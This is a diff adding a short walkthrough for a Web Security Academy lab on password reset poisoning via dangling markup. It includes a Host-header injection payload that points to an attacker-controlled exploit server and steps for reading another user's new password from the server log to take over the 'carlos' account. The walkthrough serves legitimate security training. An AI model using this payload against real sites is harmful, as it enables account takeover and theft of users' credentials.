@@ -16,3 +16,5 @@ Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-passwo
 
 # Lab: Password reset poisoning via dangling markup
 
+Forgot password -> Enter your own username -> Capture POST request in Burp -> In Repeater, change Host header to add an arbitrary port: `[id].web-security-academy.net:1234` -> Send -> Go to exploit server -> Open email client -> View raw version of email -> Notice your port reflected unescaped in a link followed by the new password -> 
+Now inject dangling markup: `Host: [id].web-security-academy.net:'<a href="//YOUR-EXPLOIT-ID.exploit-server.net/` -> Send -> Check email client (raw version) -> Go to exploit server access log -> Find `GET /?/login'>...` containing the rest of the email with your password -> Change username to `carlos` -> Send -> Refresh access log -> Get Carlos's new password from log -> Login as carlos
